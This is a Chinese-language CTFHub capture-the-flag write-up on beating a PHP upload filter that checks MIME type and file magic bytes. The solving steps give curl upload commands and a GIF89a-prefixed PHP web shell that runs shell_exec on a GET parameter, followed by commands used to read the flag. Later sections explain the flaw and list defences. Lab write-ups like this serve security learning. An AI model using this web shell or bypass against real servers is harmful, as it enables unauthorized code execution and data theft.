---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 文件头检查"
date: 2026-10-28

skill: "web-upload/文件头检查"
completed: true
---

# CTFHub Writeup - 文件头检查

## 题目类型

Web

## 题目描述

CTFHub 文件上传 - 文件头检测
Filename:选择文件 未选择文件
Submit


## 解题过程

<br>1. 记录中整理的 index.php 检查逻辑显示：上传逻辑先判断 $\_FILES\['file'\]\['type'\] 是否属于 image/jpeg、image/jpg、image/png、image/gif；随后以 rb 打开临时文件并读取前 4 字节，经 bin2hex 后与 89504E47、FFD8FFE0、47494638 比对；通过后用 basename 保留文件名并 move\_uploaded\_file 到 UPLOAD\_PATH。
<br>2. 第一次尝试上传纯 PHP 文件时，使用 curl.exe -s -F "file=@shell.php;type=image/png" -F "submit=Submit" http://.../；响应为 \<script\>alert('文件错误')\</script\>。记录判断 MIME 检查已通过，但文件前 4 字节是 \<?ph，对应十六进制 3C 3F 70 68，不在魔数白名单中。
<br>3. 随后构造 GIF 与 PHP 双面文件：在 PHP 代码前加入 GIF89a，使前 4 字节为 GIF8；PHP 代码为 \<?php echo shell\_exec($\_GET\["c"\]); ?\>。上传时使用 filename=shell.php、type=image/gif，并通过管道将 GIF89a、换行和 PHP 代码交给 curl.exe 的 -F "file=@-;filename=shell.php;type=image/gif"。响应显示 \<script\>alert('上传成功')\</script\> 以及 upload/shell.php。
<br>4. 随后访问 http://.../upload/shell.php?c=id，响应中先输出 GIF89a，再输出 uid=33(www-data) gid=33(www-data) groups=33(www-data)。记录指出开头的 GIF89a 被原样输出，说明文件头只是普通文本。
<br>5. 最后使用 ?c=cat /var/www/html/flag\_685621138.php 读取文件，响应中输出 GIF89a 和 \<?php // ctfhub\{9e88deac4010992c4c1f5a13\}。

## 疑问与解答

### 1.

<br>问题：为什么把 MIME 改成 image/png 仍然上传失败？
<br>解答：$\_FILES\['file'\]\['type'\] 来自客户端请求，可被修改；但服务端还读取真实文件的前 4 字节并比对图片魔数。纯 PHP 文件开头是 \<?ph，对应 3C 3F 70 68，不匹配任何允许的魔数，所以会返回文件错误。

### 2.

<br>问题：为什么在 PHP 代码前加 GIF89a 就能通过检查？
<br>解答：检查只读取前 4 字节，GIF89a 的前 4 字节是 GIF8，十六进制为 47 49 46 38，正好匹配 GIF 魔数 47494638；后续 PHP 代码不参与文件头比对。

### 3.

<br>问题：带图片头的文件为何仍能作为 PHP 执行？
<br>解答：本题只检查文件头，不验证完整图片结构，且上传后保留 .php 后缀；Web 服务器按后缀把文件交给 PHP 解析，GIF89a 被当作普通输出，后面的 \<?php ... ?\> 仍会执行。


## 本题的核心逻辑：



<br>本题的防护点有两层：客户端自报 MIME 和真实内容前 4 字节魔数。MIME 可伪造，而魔数检查只覆盖文件开头、不校验完整文件格式，也不限制最终后缀，因此检查强度不足。

<br>利用方式是构造同时满足文件头检查和代码执行的文件：用 GIF89a 提供合法前 4 字节，再拼接 PHP 代码，并保留 .php 文件名。上传成功后通过 Web 访问触发 PHP 执行，再用参数执行系统命令读取 flag。


## 笔记

这道题主要学习了：

<br>1. 文件上传检查不能只依赖客户端 MIME 或少量魔数；服务端应校验完整文件结构、重命名文件、限制可执行后缀，并将上传目录设置为不可执行。
<br>2. 构造图片头加代码的双面文件是绕过文件头检查的常见思路，本题使用 GIF89a 作为前缀，使前 4 字节为 GIF8，同时保留 .php 后缀，从而在访问时触发 PHP 解析。
<br>3. 后续学习可关注完整图片校验、二次渲染、后缀黑名单与白名单、上传目录权限和 Web 服务器解析配置等防护与绕过方式。
